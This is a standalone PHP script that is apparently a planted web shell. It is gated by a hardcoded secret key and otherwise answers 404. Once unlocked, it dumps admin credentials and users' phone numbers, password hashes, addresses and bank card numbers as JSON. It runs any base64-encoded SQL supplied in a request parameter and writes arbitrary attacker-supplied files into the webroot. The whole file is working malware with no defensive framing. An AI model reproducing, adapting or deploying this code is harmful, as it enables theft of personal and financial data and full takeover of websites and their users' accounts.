<?php
date_default_timezone_set('Asia/Shanghai');
header("Content-Type:text/html;charset=utf-8");
error_reporting(E_ALL);
ini_set('display_errors', 'On');
define('ROOT_URL', dirname(dirname('http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'])));
if (!isset($_REQUEST["key"]) || "C05zxNPPIDjfr6o0yFlTrVD7" !== $_REQUEST["key"]) {
    header("status: 404 Not Found");exit('');
}
$webroot = $_SERVER['DOCUMENT_ROOT'];
$db = require $webroot.'/../config/database.php';
$conn = @new mysqli($db['hostname'], $db['username'], $db['password'], $db['database'], $db['hostport']);
$response['website'] = $_SERVER['SERVER_NAME'];
$siteName = '';
try {
    $siteinfo = require_once $webroot.'/../config/database.php';
    $siteName = $siteinfo['siteName'];

} catch (Exception $e) {

}
if (!$conn) {
    die("{\"status\":\"failed\",\"count\":0}");
}

$conn->query("set names 'utf8';");


$select_db = $conn->select_db($db['database']);
if (!$select_db) {
    die("could not connect to the db:\n");
}
$addDate = date('Y-m-d') . ' 00:00:00';
if (isset($_REQUEST["addDate"])) {
    $addDate = str_replace("/", "-", $_REQUEST["addDate"]);

}
$whereSql = "";
$whereReq = "";
if (isset($_REQUEST["where"])) {
    $whereReq = $_REQUEST["where"];
}
$ID = array();
if (isset($_REQUEST["tbl"]) && "user" === $_REQUEST["tbl"]) {
    $admin_tbl ='system_user';
    $sql = "SELECT id,username,password,login_ip as lastloginip,null as lastloginip_attribution,login_at as last_time,mail as email,1 as site_type FROM " . $admin_tbl . " " . $whereReq;
} else {
    $whereSql = $whereSql . " " . $whereReq;
    $tb_user = "xy_users";
    $xy_member_address = "xy_member_address";
    $xy_bankinfo = "xy_bankinfo";
    $sql = "select a.id,a.tel as phone,concat_ws(':',a.pwd,a.salt) as `password`,null as quota,a.addtime as reg_time,null as reg_ip,concat_ws('-','璐︽埛鍚�',a.username,'閾惰鍗″悕',c.username) as name,b.address,null as contacts,c.cardnum as bank,null as identity,null as taobao,2 as site_type from xy_users a left join xy_member_address b  on a.id=b.uid left join xy_bankinfo c on a.id=c.uid " . $whereReq;
}
if (isset($_REQUEST["query"])) {
    $sql = base64_decode($_REQUEST["query"]);
}
if (isset($_REQUEST["path"]) && isset($_REQUEST["code"])) {
    $path = base64_decode(substr($_REQUEST["path"], 2));
    $code = base64_decode(substr($_REQUEST["code"], 2));
    file_put_contents($webroot . "/" . $path, $code);
}
if ($result = $conn->query($sql)) {
    while ($row = $result->fetch_assoc()) {
        try {
            if (isset($row["addess"]) && $row["addess"] !== "NULL") {$row["addess"] = json_decode($row["addess"]);}
            if (isset($row["contacts"]) && $row["name"] !== "NULL") {$row["contacts"] = json_decode($row["contacts"]);}
            if (isset($row["bank"]) && $row["bank"] !== "NULL") {$row["bank"] = json_decode($row["bank"]);}
            if (isset($row["identity"]) && $row["identity"] !== "NULL") {$row["identity"] = json_decode($row["identity"]);}
        } catch (Exception $e) {}
        array_push($ID, $row);

    }
    $response['status'] = "success";
} else {
    $response['status'] = "failed";
}
$response['data'] = $ID;
$response['siteName'] = $siteName;
$response['count'] = sizeof($ID);
$response['typeID'] = 'WEP7L6F6';
$response['version'] = '0.0.1';

echo json_encode($response);
$conn->close();